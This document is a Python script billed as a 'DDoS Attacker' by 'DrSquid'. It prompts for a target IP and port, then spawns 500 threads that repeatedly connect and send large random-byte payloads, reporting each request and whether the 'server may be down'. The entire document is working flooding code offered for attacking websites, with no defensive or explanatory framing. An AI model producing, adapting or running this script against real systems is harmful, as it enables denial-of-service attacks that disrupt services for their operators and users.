import socket, random, time, threading, sys
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = random._urandom(42069)
sent = 0
request_sent = 0
print("  _____  _____        _____           _   _             _               ___    ___  ")
print(" |  __ \|  __ \      / ____|     /\  | | | |           | |             |__ \  / _ \ ")
print(" | |  | | |  | | ___| (___      /  \ | |_| |_ __ _  ___| | _____ _ __     ) || | | |")
print(" | |  | | |  | |/ _  \___ \    / /\ \| __| __/ _` |/ __| |/ / _ \ '__|   / / | | | |")
print(" | |__| | |__| | (_) |___) |  / ____ \ |_| || (_| | (__|   <  __/ |     / /_ | |_| |")
print(" |_____/|_____/ \___/_____/  /_/    \_\__|\__\__,_|\___|_|\_\___|_|    |____(_)___/ ")
print(" Script By DrSquid")
print("")
print("[+] This Script works on separate websites.")
while True:
    try:
        port = int(input("[+] Enter the port to attack: "))
        ip = input("[+] Enter the IP to attack: ")
        ip = socket.gethostbyname(ip)
        break
    except:
        print("[+] Invalid Input.")
        print("")
try:
    print("[+] Preparing Attack for IP:", ip)
except:
    pass
time.sleep(1)
prevcount = 0
print("")
sent = 0
request_sent = 0
thread_num_mutex = threading.Lock()
def printstatus():
    global request_sent
    request_sent += 1
    thread_num_mutex.acquire(True)
    print("[+] DDoS Attack {} Port - IP: {} - {} Requests Sent".format(port, ip, request_sent))
    thread_num_mutex.release()
def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            printstatus()
            sock.connect((ip, port))
            sock.send(packet)
        except socket.error:
            print("[+] Server may be down.")
threads = []
for i in range(500):
    x = threading.Thread(target=attack)
    x.start()
    threads.append(x)
for currentthread in threads:
    currentthread.join()
